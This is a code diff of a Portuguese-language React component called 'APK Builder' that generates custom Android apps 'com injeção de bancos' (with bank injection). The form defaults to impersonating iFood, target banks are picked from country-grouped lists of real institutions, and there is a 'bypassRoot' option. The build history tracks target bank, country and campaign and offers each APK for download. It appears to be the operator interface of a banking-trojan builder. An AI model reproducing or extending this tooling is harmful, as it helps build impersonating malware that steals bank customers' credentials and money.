@@ -1,5 +1,4 @@
-"use client";
-
+import z from "zod";
 import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -34,6 +33,8 @@ export function APKBuilder() {
     refetchInterval: 2000, // Recarregar a cada 2 segundos
   });
   const clearHistoryMutation = trpc.apk.clearHistory.useMutation();
+
+  const builds = listQuery.data || [];
 
   const handleBuild = async () => {
     if (!appName.trim()) {
@@ -78,126 +79,118 @@ export function APKBuilder() {
 
       let attempts = 0;
       while (attempts < 30) {
-        const builds = await listQuery.refetch();
-        if (builds.data && builds.data[0]?.status === "success") {
+        await new Promise((resolve) => setTimeout(resolve, 1000));
+        const updated = await listQuery.refetch();
+        if (updated.data && updated.data.length > 0 && updated.data[0].status === "success") {
           break;
         }
-        await new Promise((resolve) => setTimeout(resolve, 1000));
         attempts++;
       }
 
-      setIsBuilding(false);
+      setAppName("iFood");
+      setAppUrl("https://www.ifood.com.br/");
+      setLogoUrl("");
       setBuildProgress(0);
     } catch (error) {
       console.error("Erro ao gerar APK:", error);
       toast.error("Erro ao gerar APK");
-      setIsBuilding(false);
       setBuildProgress(0);
     } finally {
       if (progressInterval) clearInterval(progressInterval);
+      setIsBuilding(false);
     }
   };
 
-  const builds = listQuery.data || [];
-
   return (
-    <div className="min-h-screen bg-gradient-to-b from-slate-900 via-slate-800 to-slate-900 p-6">
-      <div className="max-w-7xl mx-auto space-y-6">
-        {/* Header */}
+    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 p-6">
+      <div className="max-w-7xl mx-auto">
         <div className="mb-8">
           <h1 className="text-4xl font-bold text-white mb-2 flex items-center gap-3">
             <Hammer className="w-8 h-8 text-cyan-400" />
             APK Builder
           </h1>
-          <p className="text-gray-400">Crie APKs customizados para seu negócio</p>
+          <p className="text-gray-400">Gere APKs customizadas com injeção de bancos</p>
         </div>
 
-        {/* Configuração + Pré-visualização */}
         <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
-          {/* Coluna de Configuração (2/3) */}
+          {/* Coluna de Formulário (2/3) */}
           <div className="lg:col-span-2">
             <Card className="bg-slate-800 border-slate-700">
               <CardHeader>
-                <CardTitle className="flex items-center gap-2">
-                  <Smartphone className="w-5 h-5 text-cyan-400" />
-                  Configuração
-                </CardTitle>
-                <CardDescription>Personalize seu APK</CardDescription>
+                <CardTitle>Configuração do App</CardTitle>
+                <CardDescription>Preencha os dados para gerar sua APK</CardDescription>
               </CardHeader>
               <CardContent className="space-y-6">
                 {/* Nome do App */}
                 <div>
                   <Label htmlFor="appName" className="text-gray-300 mb-2 block">
-                    Nome do App *
+                    Nome do App
                   </Label>
                   <Input
                     id="appName"
                     value={appName}
                     onChange={(e) => setAppName(e.target.value)}
-                    placeholder="Ex: iFood"
                     disabled={isBuilding}
-                    className="bg-slate-700 border-slate-600 text-white placeholder-gray-500"
+                    placeholder="Ex: iFood, WhatsApp, etc"
+                    className="bg-slate-700 border-slate-600 text-white"
                   />
-                  <p className="text-xs text-gray-500 mt-1">Aparecerá no ícone do app</p>
                 </div>
 
                 {/* URL do App */}
                 <div>
                   <Label htmlFor="appUrl" className="text-gray-300 mb-2 block">
-                    URL do App *
+                    URL do App
                   </Label>
                   <Input
                     id="appUrl"
                     value={appUrl}
                     onChange={(e) => setAppUrl(e.target.value)}
-                    placeholder="https://www.ifood.com.br/"
                     disabled={isBuilding}
-                    className="bg-slate-700 border-slate-600 text-white placeholder-gray-500"
+                    placeholder="https://www.exemplo.com"
+                    className="bg-slate-700 border-slate-600 text-white"
                   />
-                  <p className="text-xs text-gray-500 mt-1">Se não começar com http/https, adicionamos https:// automaticamente.</p>
                 </div>
 
-                {/* Logo do App */}
+                {/* Logo URL */}
                 <div>
-                  <Label htmlFor="logo" className="text-gray-300 mb-2 block">
-                    Logo do App (URL)
+                  <Label htmlFor="logoUrl" className="text-gray-300 mb-2 block">
+                    URL da Logo (opcional)
                   </Label>
                   <Input
-                    id="logo"
+                    id="logoUrl"
                     value={logoUrl}
                     onChange={(e) => setLogoUrl(e.target.value)}
-                    placeholder="https://via.placeholder.com/150"
                     disabled={isBuilding}
-                    className="bg-slate-700 border-slate-600 text-white placeholder-gray-500"
+                    placeholder="https://exemplo.com/logo.png"
+                    className="bg-slate-700 border-slate-600 text-white"
                   />
-                  <p className="text-xs text-gray-500 mt-1">Opcional - Logo no ícone do app</p>
                 </div>
 
-                {/* Version Name e Version Code */}
+                {/* Versão */}
                 <div className="grid grid-cols-2 gap-4">
                   <div>
                     <Label htmlFor="versionName" className="text-gray-300 mb-2 block">
-                      Version Name
+                      Versão
                     </Label>
                     <Input
                       id="versionName"
                       value={versionName}
                       onChange={(e) => setVersionName(e.target.value)}
-                      placeholder="1.0.0"
                       disabled={isBuilding}
+                      placeholder="1.0.0"
                       className="bg-slate-700 border-slate-600 text-white"
                     />
                   </div>
                   <div>
                     <Label htmlFor="versionCode" className="text-gray-300 mb-2 block">
-                      Version Code
+                      Código da Versão
                     </Label>
                     <Input
                       id="versionCode"
                       value={versionCode}
                       onChange={(e) => setVersionCode(e.target.value)}
-                      placeholder="1"
                       disabled={isBuilding}
+                      placeholder="1"
                       className="bg-slate-700 border-slate-600 text-white"
                     />
                   </div>
@@ -278,109 +271,79 @@ export function APKBuilder() {
                       <option>Banco de Chile</option>
                       <option>Banco Santander Chile</option>
                       <option>BBVA Chile</option>
-                      <option>Banco Itaú Chile</option>
                       <option>Banco Security</option>
+                      <option>Banco Estado</option>
+                      <option>Banco Itaú Chile</option>
                       <option>Banco Falabella</option>
                       <option>Scotiabank Chile</option>
-                      <option>Banco Estado</option>
                     </optgroup>
                     <optgroup label="🇨🇴 Colômbia">
                       <option>Banco de Bogotá</option>
-                      <option>Banco Santander Colombia</option>
+                      <option>Banco de Occidente</option>
                       <option>BBVA Colombia</option>
-                      <option>Banco de Crédito e Inversiones</option>
-                      <option>Banco Occidente</option>
-                      <option>Banco Popular</option>
+                      <option>Banco Santander Colombia</option>
+                      <option>Banco Davivienda</option>
                       <option>Banco Caja Social</option>
-                      <option>Banco Av Villas</option>
-                    </optgroup>
-                    <optgroup label="🇲🇽 México">
-                      <option>Banamex</option>
-                      <option>BBVA México</option>
-                      <option>Banco Santander México</option>
-                      <option>Banco Azteca</option>
-                      <option>Banco Inbursa</option>
-                      <option>Banco Interacciones</option>
-                      <option>Scotiabank México</option>
-                      <option>Banco Mifel</option>
-                    </optgroup>
-                    <optgroup label="🇵🇪 Peru">
-                      <option>Banco de Crédito del Perú</option>
-                      <option>Banco Continental</option>
-                      <option>BBVA Perú</option>
-                      <option>Banco Santander Perú</option>
-                      <option>Banco Interamericano de Finanzas</option>
-                      <option>Banco Azteca Perú</option>
-                      <option>Scotiabank Perú</option>
-                      <option>Banco Falabella Perú</option>
+                      <option>Banco Pichincha</option>
+                      <option>Banco Popular</option>
                     </optgroup>
                     <optgroup label="🇪🇸 Espanha">
-                      <option>BBVA España</option>
-                      <option>Banco Santander España</option>
+                      <option>Banco Bilbao Vizcaya Argentaria (BBVA)</option>
+                      <option>Banco Santander</option>
                       <option>CaixaBank</option>
-                      <option>Banco Bilbao Vizcaya</option>
                       <option>Banco Sabadell</option>
-                      <option>Banco Popular Español</option>
+                      <option>Banco de Crédito e Inversiones</option>
+                      <option>ING España</option>
                       <option>Banco Mediolanum</option>
-                      <option>Banco Inversor</option>
-                    </optgroup>
-                    <optgroup label="🇵🇹 Portugal">
-                      <option>Banco de Portugal</option>
-                      <option>Caixa Geral de Depósitos</option>
-                      <option>Banco Comercial Português</option>
-                      <option>Banco Santander Portugal</option>
-                      <option>BBVA Portugal</option>
-                      <option>Banco Montepio</option>
-                      <option>Banco Activo</option>
-                      <option>Banco Best</option>
-                    </optgroup>
-                    <optgroup label="🇬🇧 Reino Unido">
-                      <option>HSBC UK</option>
-                      <option>Barclays Bank</option>
-                      <option>Lloyds Banking Group</option>
-                      <option>Royal Bank of Scotland</option>
-                      <option>Santander UK</option>
-                      <option>NatWest Group</option>
-                      <option>Nationwide Building Society</option>
-                      <option>Virgin Money</option>
+                      <option>Banco Caminos</option>
                     </optgroup>
                     <optgroup label="🇺🇸 Estados Unidos">
                       <option>Bank of America</option>
                       <option>Wells Fargo</option>
-                      <option>JPMorgan Chase</option>
+                      <option>Chase Bank</option>
                       <option>Citibank</option>
-                      <option>Goldman Sachs</option>
-                      <option>Morgan Stanley</option>
+                      <option>Goldman Sachs Bank</option>
+                      <option>Morgan Stanley Bank</option>
                       <option>U.S. Bank</option>
-                      <option>PNC Financial</option>
+                      <option>PNC Bank</option>
                     </optgroup>
                     <optgroup label="🇫🇷 França">
                       <option>BNP Paribas</option>
                       <option>Société Générale</option>
                       <option>Crédit Agricole</option>
                       <option>Banque de France</option>
+                      <option>Banque Postale</option>
                       <option>Natixis</option>
-                      <option>La Banque Postale</option>
-                      <option>Banque Populaire</option>
-                      <option>Caisse d'Epargne</option>
+                      <option>Crédit Mutuel</option>
+                      <option>Caisse d'Épargne</option>
                     </optgroup>
-                    <optgroup label="🇩🇪 Alemanha">
-                      <option>Deutsche Bank</option>
-                      <option>Commerzbank</option>
-                      <option>Dresdner Bank</option>
-                      <option>HypoVereinsbank</option>
-                      <option>Postbank</option>
-                      <option>Sparkasse</option>
-                      <option>ING-DiBa</option>
-                      <option>Comdirect Bank</option>
+                    <optgroup label="🇵🇹 Portugal">
+                      <option>Caixa Geral de Depósitos</option>
+                      <option>Banco BPI</option>
+                      <option>Banco Santander Portugal</option>
+                      <option>Banco Montepio</option>
+                      <option>BBVA Portugal</option>
+                      <option>Banco Activo</option>
+                      <option>Banco Carregosa</option>
+                      <option>Banco Português de Investimento</option>
+                    </optgroup>
+                    <optgroup label="🇲🇽 México">
+                      <option>BBVA México</option>
+                      <option>Banco Santander México</option>
+                      <option>Citibanamex</option>
+                      <option>Scotiabank Inverlat</option>
+                      <option>Banco Azteca</option>
+                      <option>Banco Inbursa</option>
+                      <option>Banco Mifel</option>
+                      <option>Banco Regional</option>
                     </optgroup>
                   </select>
                 </div>
 
-                {/* Origem do Link APK */}
+                {/* Origem do Link */}
                 <div>
                   <Label htmlFor="origemLink" className="text-gray-300 mb-2 block">
-                    Origem do Link APK
+                    Origem do Link
                   </Label>
                   <select
                     id="origemLink"
@@ -389,15 +352,18 @@ export function APKBuilder() {
                     disabled={isBuilding}
                     className="w-full bg-slate-700 border border-slate-600 text-white rounded px-3 py-2"
                   >
-                    <option>Automatico (EAS -&gt; Storage -&gt; Local)</option>
-                    <option>EAS</option>
-                    <option>Storage</option>
-                    <option>Local</option>
+                    <option>Automático</option>
+                    <option>Campanha 1</option>
+                    <option>Campanha 2</option>
+                    <option>Campanha 3</option>
+                    <option>Teste</option>
                   </select>
                 </div>
 
-                {/* Checkboxes */}
-                <div className="space-y-3 pt-4 border-t border-slate-700">
+                {/* Opções Avançadas */}
+                <div className="space-y-3 p-4 bg-slate-700/50 rounded border border-slate-600">
+                  <p className="text-sm font-semibold text-gray-300">Opções Avançadas</p>
+
                   <div className="flex items-center space-x-2">
                     <Checkbox
                       id="bypassRoot"
@@ -501,20 +467,29 @@ export function APKBuilder() {
                             }}
                           />
                         ) : (
-                          <div className="w-20 h-20 bg-gradient-to-br from-cyan-500 to-blue-600 rounded-2xl flex items-center justify-center text-3xl shadow-lg">
+                          <div className="w-20 h-20 bg-gradient-to-br from-cyan-400 to-blue-600 rounded-2xl flex items-center justify-center text-3xl">
                             📱
                           </div>
                         )}
                       </div>
 
                       {/* App Name */}
-                      <div className="text-white font-semibold text-lg">{appName || "App Name"}</div>
-                      
-                      {/* App URL */}
-                      <div className="text-gray-400 text-xs break-all">{appUrl || "URL do App"}</div>
-                      
-                      {/* Tap to Open */}
-                      <div className="text-cyan-400 text-sm pt-2">Toque para abrir</div>
+                      <div>
+                        <p className="text-white font-bold text-lg">{appName || "App"}</p>
+                        <p className="text-xs text-gray-400">v{versionName}</p>
+                      </div>
+
+                      {/* URL Preview */}
+                      <div className="bg-slate-700/50 rounded p-2 border border-slate-600">
+                        <p className="text-xs text-gray-300 truncate">{appUrl || "URL do app"}</p>
+                      </div>
+
+                      {/* Info */}
+                      <div className="space-y-1 text-xs text-gray-400 pt-4 border-t border-slate-700">
+                        <p>🌍 {pais}</p>
+                        <p>🏦 {banco}</p>
+                        <p>📍 {origemLink}</p>
+                      </div>
                     </div>
                   </div>
                 </div>
@@ -523,12 +498,12 @@ export function APKBuilder() {
           </div>
         </div>
 
-        {/* Como funciona */}
-        <Card className="bg-slate-800 border-slate-700">
+        {/* Informações */}
+        <Card className="bg-slate-800 border-slate-700 mt-6">
           <CardHeader>
             <CardTitle className="flex items-center gap-2">
-              <AlertCircle className="w-5 h-5 text-cyan-400" />
-              Como funciona:
+              <CheckCircle2 className="w-5 h-5 text-green-400" />
+              Como funciona
             </CardTitle>
           </CardHeader>
           <CardContent className="space-y-3 text-sm text-gray-300">
@@ -573,7 +548,7 @@ export function APKBuilder() {
 
         {/* Histórico de Builds */}
         {builds.length > 0 && (
-          <Card className="bg-slate-800 border-slate-700">
+          <Card className="bg-slate-800 border-slate-700 mt-6">
             <CardHeader className="flex flex-row items-center justify-between">
               <CardTitle>Histórico de Builds</CardTitle>
               <Button
@@ -587,42 +562,69 @@ export function APKBuilder() {
               </Button>
             </CardHeader>
             <CardContent>
-              <div className="space-y-2 max-h-96 overflow-y-auto">
+              <div className="space-y-3 max-h-96 overflow-y-auto">
                 {builds.map((build) => (
                   <div
                     key={build.id}
-                    className="flex items-center justify-between p-3 bg-slate-700/50 rounded border border-slate-600 hover:border-slate-500 transition-colors"
+                    className="flex flex-col p-3 bg-slate-700/50 rounded border border-slate-600 hover:border-slate-500 transition-colors space-y-2"
                   >
-                    <div className="flex-1">
-                      <p className="font-medium text-white">{build.appName}</p>
-                      <p className="text-xs text-gray-400">{build.filename}</p>
-                    </div>
-                    <div className="text-right">
-                      <p className="text-xs text-gray-400">
-                        {build.fileSize ? (
-                          build.fileSize < 1024 * 1024
-                            ? `${(build.fileSize / 1024).toFixed(2)}KB`
-                            : `${(build.fileSize / 1024 / 1024).toFixed(2)}MB`
-                        ) : (
-                          "Processando..."
-                        )}
-                      </p>
-                      <p
-                        className={`text-xs font-semibold ${
-                          build.status === "success"
-                            ? "text-green-400"
+                    <div className="flex items-center justify-between">
+                      <div className="flex-1">
+                        <p className="font-medium text-white">{build.appName}</p>
+                        <p className="text-xs text-gray-400">{build.filename}</p>
+                      </div>
+                      <div className="text-right">
+                        <p className="text-xs text-gray-400">
+                          {build.fileSize ? (
+                            build.fileSize < 1024 * 1024
+                              ? `${(build.fileSize / 1024).toFixed(2)}KB`
+                              : `${(build.fileSize / 1024 / 1024).toFixed(2)}MB`
+                          ) : (
+                            "Processando..."
+                          )}
+                        </p>
+                        <p
+                          className={`text-xs font-semibold ${
+                            build.status === "success"
+                              ? "text-green-400"
+                              : build.status === "building"
+                              ? "text-yellow-400"
+                              : "text-red-400"
+                          }`}
+                        >
+                          {build.status === "success"
+                            ? "✓ Pronto"
                             : build.status === "building"
-                            ? "text-yellow-400"
-                            : "text-red-400"
-                        }`}
-                      >
-                        {build.status === "success"
-                          ? "✓ Pronto"
-                          : build.status === "building"
-                          ? "⏳ Gerando"
-                          : "✗ Erro"}
-                      </p>
+                            ? "⏳ Gerando"
+                            : "✗ Erro"}
+                        </p>
+                      </div>
                     </div>
+                    
+                    {/* Informações de Banco e País */}
+                    <div className="flex flex-wrap gap-4 text-xs text-gray-400 border-t border-slate-600 pt-2">
+                      <div>
+                        <span className="text-gray-500">🏦 Banco:</span> {build.banco || "N/A"}
+                      </div>
+                      <div>
+                        <span className="text-gray-500">🌍 País:</span> {build.pais || "N/A"}
+                      </div>
+                      <div>
+                        <span className="text-gray-500">📍 Origem:</span> {build.origemLink || "N/A"}
+                      </div>
+                    </div>
+                    
+                    {/* Botão de Download */}
+                    {build.status === "success" && build.downloadUrl && (
+                      <a
+                        href={build.downloadUrl}
+                        download={build.filename}
+                        className="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-600 hover:to-blue-700 text-white font-semibold py-2 rounded text-center text-sm transition-all flex items-center justify-center gap-2"
+                      >
+                        <Download className="w-4 h-4" />
+                        Baixar APK
+                      </a>
+                    )}
                   </div>
                 ))}
               </div>
